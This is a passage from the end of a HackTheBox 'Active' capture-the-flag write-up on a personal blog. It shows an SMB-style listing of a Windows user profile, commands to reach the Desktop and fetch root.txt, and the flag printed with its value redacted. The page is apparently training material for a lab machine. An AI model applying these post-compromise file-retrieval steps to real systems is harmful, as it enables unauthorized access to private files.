+drw-rw-rw- 0 Mon Jul 30 15:50:27 2018 Downloads<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Favorites<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Links<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Local Settings<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Music<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 My Documents<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 NetHood<br>
+-rw-rw-rw- 524288 Mon Jul 30 19:21:29 2018 NTUSER.DAT<br>
+-rw-rw-rw- 262144 Mon Jul 30 19:21:29 2018 ntuser.dat.LOG1<br>
+-rw-rw-rw- 0 Mon Jul 16 12:14:09 2018 ntuser.dat.LOG2<br>
+-rw-rw-rw- 65536 Mon Jul 16 12:14:15 2018 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf<br>
+-rw-rw-rw- 524288 Mon Jul 16 12:14:15 2018 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms<br>
+-rw-rw-rw- 524288 Mon Jul 16 12:14:15 2018 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms<br>
+-rw-rw-rw- 20 Mon Jul 30 08:26:35 2018 ntuser.ini<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Pictures<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 PrintHood<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Recent<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Saved Games<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Searches<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 SendTo<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Start Menu<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Templates<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Videos</p>
+<h1 id="cd-desktop-1">cd Desktop</h1>
+<h1 id="ls-12">ls</h1>
+<p>drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 .<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 ..<br>
+-rw-rw-rw- 282 Mon Jul 30 15:50:10 2018 desktop.ini<br>
+-rw-rw-rw- 34 Sat Jul 21 17:06:06 2018 root.txt</p>
+<h1 id="get-roottxt">get root.txt</h1>
+<h1 id="exit-2">exit</h1>
+<p>root@kali:~/active# cat root.txt<br>
+b5f#########ZENSIERT#########08b</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://m10x.github.io/tags/hackthebox/">hackthebox</a></span>
+        <span class="tag"><a href="https://m10x.github.io/tags/ctf/">ctf</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1464 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2010-01-01 01:01
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HackTheBox%20-%20Active&amp;caption=HackTheBox%20-%20Active&amp;canonicalUrl=https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HackTheBox%20-%20Active&amp;body=https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f&amp;media=https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f;description=HackTheBox%20-%20Active" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f&amp;title=HackTheBox%20-%20Active&amp;summary=HackTheBox%20-%20Active&amp;source=https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f&amp;resubmit=true&amp;title=HackTheBox%20-%20Active" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f;title=HackTheBox%20-%20Active" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HackTheBox%20-%20Active%20https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f&amp;t=HackTheBox%20-%20Active" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HackTheBox%20-%20Active&amp;url=https%3a%2f%2fm10x.github.io%2fposts%2f2010%2f01%2fhackthebox-active%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h"></span>
+            <hr />
+        </div>
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://m10x.github.io/posts/2010/01/first-post/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">First post</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://m10x.github.io/posts/2010/01/hackthebox-bitlab/">
+                    <span class="button__text">HackTheBox - Bitlab</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            <span><a href="https://m10x.github.io/">m10x</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span><span><a href="https://m10x.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+          </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://m10x.github.io/bundle.min.2ce64ea6ea44a72b13dd812fc2eb5cca3efe878cce258a47c137c17edf46e0602a05e422b618a5b80b5939c731b7a293351c2f2222a21f6ee27e54a8448dd20e.js" integrity="sha512-LOZOpupEpysT3YEvwutcyj7&#43;h4zOJYpHwTfBft9G4GAqBeQithiluAtZOccxt6KTNRwvIiKiH27iflSoRI3SDg=="></script>
+
+
+
+    </body>
+</html>
